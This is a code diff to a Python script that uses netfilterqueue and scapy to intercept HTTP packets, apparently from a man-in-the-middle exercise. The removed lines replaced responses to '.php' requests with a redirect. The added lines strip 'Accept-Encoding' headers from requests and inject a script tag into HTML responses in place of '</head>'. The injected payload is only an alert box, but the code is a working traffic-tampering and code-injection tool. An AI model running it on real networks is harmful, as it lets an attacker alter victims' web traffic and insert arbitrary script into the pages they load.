@@ -4,8 +4,7 @@
 
 import netfilterqueue
 import scapy.all as scapy
-
-ack_list = []
+import re
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -17,19 +16,20 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("HTTP Request")
-            if ".php" in str(scapy_packet[scapy.Raw].load):
-                print(".php requested")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("HTTP Response")
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("Replacing file")
-                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permenantly\nLocation: https://www.nfl.com/\n\n")
-                packet.set_payload(bytes(modified_packet))
+            print(scapy_packet.show())
+            load = load.replace("</head>", "<script>alert('Angelina is Hot');</script></body>")
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
